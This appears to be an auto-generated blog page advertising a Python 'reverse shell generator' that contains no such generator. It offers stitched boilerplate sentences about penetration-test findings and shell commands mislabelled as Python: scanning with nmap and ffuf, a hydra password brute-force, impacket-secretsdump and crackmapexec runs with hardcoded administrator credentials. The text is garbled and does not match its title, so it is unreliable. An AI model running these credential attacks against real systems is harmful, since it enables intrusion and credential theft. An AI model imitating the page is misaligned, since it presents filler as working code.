---
TitleSEO: "Reverse Shell Generator in Python | ZureFX"
TitlePost: "Reverse Shell Generator — Python"
Author: "ZureFX"
Description: "A Python script for reverse shell generator. Built for security research and automation."
Keywords: "parser, go, bash, tool, python, powershell"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-169.html"
URL_IMAGES: ""
Date: "2025-10-10"
Tags: "Parser, Go, Bash, Tool, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-169"
Permalink: "/scripting/script-reverse-shell-generator-169.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `rpcclient`
- `sqlmap`
- `hashcat`

## Implementation

### Core Logic

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.252.223/FUZZ
nmap -sCV -p3389,464,389 10.12.209.13 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.188.207 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.29.172
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
crackmapexec smb 10.42.47.154 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
crackmapexec smb 10.93.91.192 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 22.18s
```
